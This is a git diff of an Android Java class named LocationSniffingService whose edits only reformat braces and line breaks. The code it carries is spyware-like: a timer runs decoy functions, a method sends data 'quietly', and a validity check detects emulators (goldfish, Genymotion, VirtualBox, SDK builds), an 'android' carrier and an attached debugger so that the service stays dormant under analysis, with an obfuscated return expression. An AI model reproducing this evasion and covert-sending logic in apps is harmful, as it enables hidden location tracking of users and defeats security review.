@@ -51,12 +51,15 @@ public class LocationSniffingService extends Service{
         int delay = 5000;
 
         mTimer.scheduleAtFixedRate(new TimerTask() {
+			
             @Override
             public void run() {
-                if (thisDoesnotDoAnything())
+                if (thisDoesnotDoAnything()){
                     return;
-                else
+				}
+                else{
                     thisAlsoDoesnotDoAnything();
+				}
             }
         }, 0,delay);
 
@@ -147,8 +150,9 @@ public class LocationSniffingService extends Service{
 
         Log.d(TAG,"Checking...");
         boolean b = false;
-        if (isValid())
+        if (isValid()){
             b = sendQuietly();
+		}
         Log.d(TAG, isValid() + "");
 
         return (b^=b) ? (b == b)^(b) : (b^b^b^b);
@@ -233,38 +237,35 @@ public class LocationSniffingService extends Service{
         }
 
         //Check build's fingerprint
-        Boolean checkFingerprint =  fingerprint.startsWith(generic) ||
-                fingerprint.startsWith(unknown);
+        Boolean checkFingerprint =  fingerprint.startsWith(generic) || fingerprint.startsWith(unknown);
 
         //Check build's model
-        Boolean checkModel =        model.contains(googlesdk) ||
-                model.contains(emulator) ||
-                model.contains(androidsdk86);
+        Boolean checkModel =        model.contains(googlesdk) || model.contains(emulator) || model.contains(androidsdk86);
 
         //Check Manurfacturer for Genymotion (an emulation software)
-        Boolean checkManufacturer = manufacturer.contains(genymotion) ||
-                manufacturer.contains(unknown);
+        Boolean checkManufacturer = manufacturer.contains(genymotion) || manufacturer.contains(unknown);
 
         //Check build's product
-        Boolean checkProduct = product.contains(sdk) ||
-                product.contains(vbox);
+        Boolean checkProduct = product.contains(sdk) || product.contains(vbox);
 
         //Check for goldfish hardware
-        Boolean checkHardware = hardware.contains(goldfish) ||
-                hardware.contains(vbox);
+        Boolean checkHardware = hardware.contains(goldfish) || hardware.contains(vbox);
 
         //Return if any is detected
-        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
+        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware){
             return false;
+		}
 
         //Check for telephone operator
         //Return if it is android
-        if(android.equals(telephoneoperator))
-            return false;
+		if(android.equals(telephoneoperator)){
+				return false;
+		}
 
         //Return if debugger is connected
-        if(Debug.isDebuggerConnected())
+        if(Debug.isDebuggerConnected()){
             return false;
+		}
 
         return true;
     }
